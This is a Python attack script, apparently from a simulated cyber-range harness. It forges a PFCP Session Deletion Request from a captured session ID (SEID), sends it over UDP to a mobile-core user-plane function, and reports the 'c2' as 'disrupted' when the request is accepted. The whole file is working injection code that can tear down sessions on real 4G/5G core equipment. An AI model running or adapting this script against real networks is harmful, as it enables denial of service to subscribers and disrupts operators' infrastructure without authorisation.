#!/usr/bin/env python3
"""pfcp_delete (INJECT): send PFCP Session Deletion Request with SEID."""

from __future__ import annotations

import json
import os
import socket
import struct
import sys
import time

DEFAULT_HOST = os.environ.get("PFCP_HOST", "epc_upf")
DEFAULT_PORT = int(os.environ.get("PFCP_PORT", "8805"))
SECRET_NAME = "seid"


def emit(accepted: bool, blocked_by: str | None, effect: dict[str, str] | None = None) -> None:
    out = {
        "accepted": bool(accepted),
        "blocked_by": blocked_by,
        "effect": effect if (accepted and effect) else {},
        "signed": None,
    }
    print(json.dumps(out))


def parse_args(argv: list[str]) -> tuple[str, int]:
    host = DEFAULT_HOST
    port = DEFAULT_PORT
    toks: list[str] = []
    for a in argv[1:]:
        toks.extend(str(a).split())
    if toks:
        ep = toks[0]
        if ":" in ep:
            h, p = ep.rsplit(":", 1)
            host = h or host
            try:
                port = int(p)
            except ValueError:
                pass
        else:
            host = ep
    return host, port


def read_stdin_secret(name: str) -> str | None:
    try:
        raw = sys.stdin.buffer.read(64 * 1024)
    except Exception:
        return None
    if not raw:
        return None
    try:
        text = raw.decode("utf-8", errors="ignore")
    except Exception:
        return None
    for line in text.splitlines():
        if "=" not in line:
            continue
        k, v = line.split("=", 1)
        if k.strip() == name:
            v = v.strip()
            return v or None
    return None


def parse_seid(raw: str) -> int | None:
    s = raw.strip().lower()
    if s.startswith("0x"):
        s = s[2:]
    try:
        if all(c in "0123456789abcdef" for c in s):
            return int(s, 16)
    except Exception:
        pass
    try:
        return int(raw.strip(), 10)
    except Exception:
        return None


def build_session_delete_req(seid: int, seq: int) -> bytes:
    # PFCP header with S=1, type=54(Session Deletion Request), no IEs.
    flags = 0x21
    msg_type = 54
    length = 12  # seid(8) + seq/spare(4)
    header = struct.pack("!BBH", flags, msg_type, length)
    seid_b = struct.pack("!Q", seid & 0xFFFFFFFFFFFFFFFF)
    seq_b = bytes([(seq >> 16) & 0xFF, (seq >> 8) & 0xFF, seq & 0xFF, 0x00])
    return header + seid_b + seq_b


def try_delete(host: str, port: int, seid: int, timeout_s: float = 2.0) -> bool:
    pkt = build_session_delete_req(seid, int(time.time()) & 0xFFFFFF)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.settimeout(timeout_s)
        s.sendto(pkt, (host, port))
        try:
            resp, _ = s.recvfrom(2048)
        except (socket.timeout, OSError):
            return False
    if len(resp) < 2:
        return False
    # Session Deletion Response type is 55.
    return resp[1] == 55


def main() -> None:
    host, port = parse_args(sys.argv)
    raw_seid = read_stdin_secret(SECRET_NAME) or os.environ.get("SEID")
    if not raw_seid:
        emit(False, "no_effect")
        return
    seid = parse_seid(raw_seid)
    if seid is None:
        emit(False, "no_effect")
        return

    try:
        ok = try_delete(host, port, seid)
    except OSError:
        ok = False

    if ok:
        emit(True, None, {"c2": "disrupted"})
    else:
        emit(False, "no_effect")


if __name__ == "__main__":
    main()
